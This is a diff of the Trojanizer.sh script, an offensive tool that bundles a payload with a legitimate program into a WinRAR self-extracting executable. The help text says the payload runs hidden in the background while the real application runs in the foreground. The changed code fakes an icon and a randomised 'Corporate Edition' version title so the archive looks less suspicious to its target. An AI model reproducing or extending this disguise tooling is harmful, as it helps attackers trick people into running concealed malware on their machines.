@@ -86,22 +86,20 @@ cat << !
 -- Supported: Kali, Ubuntu, Parrot
 ---
 
-    The Trojanizer tool uses WinRAR (SFX) to compress two files inserted by user,
+    The Trojanizer tool uses WinRAR (SFX) to compress the two files inputed by user,
     and transforms it into an SFX executable(.exe) archive. The sfx archive when
-    executed it will run both files (our payload and the legit appl at the same time).
+    executed it will run both files (our payload and the legit appl inputed).
 
-    To make the archive less suspicious at execution time, trojanizer will replace
-    the default icon (.ico) of the sfx file with a user-selected one, it also allows
-    to execute a program/command before the extraction/execution of the two files.
-    To activate the Presetup funtion: [ settings -> PRE_SETUP=ON ]
+    To make the archive less suspicious to target at execution time, trojanizer will
+    try to replace the default icon(.ico) of the sfx file with a user-selected one.
 
-   'This tool will not build real trojans, but from target perpective it behaves like one' ..
-   (hidde the payload execution while the legit application also executes).
+   'Trojanizer will not build real trojans, but from target perspective, it will replicate trojan behavior'
+   (execute the payload in background, while the legit application executes in foreground).
 
 
    -- FIRST TIME RUN
-   1 - nano settings
-   2 - sudo chmod +x Trojanizer.sh
+   1 - sudo chmod +x Trojanizer.sh
+   2 - nano settings
    3 - sudo ./Trojanizer.sh
 
 !
@@ -356,9 +354,9 @@ sleep 2
 # build SFX configuration file (bin/xsf.conf)
 #
 # random version numbers
-RAN_D=$(cat /dev/urandom | tr -dc '0-9' | fold -w 1 | head -n 1)
+RAN_D=$(cat /dev/urandom | tr -dc '1-4' | fold -w 1 | head -n 1)
 RUN_T=$(cat /dev/urandom | tr -dc '0-9' | fold -w 3 | head -n 1)
-FIN_F=$(cat /dev/urandom | tr -dc '0-9' | fold -w 1 | head -n 1)
+FIN_F=$(cat /dev/urandom | tr -dc '1-7' | fold -w 1 | head -n 1)
 echo "; The sfx archive title" > $IPATH/bin/xsf.conf
 echo "Title=$N4m3 v$RAN_D.$RUN_T.$FIN_F Corporate Edition" >> $IPATH/bin/xsf.conf
   #
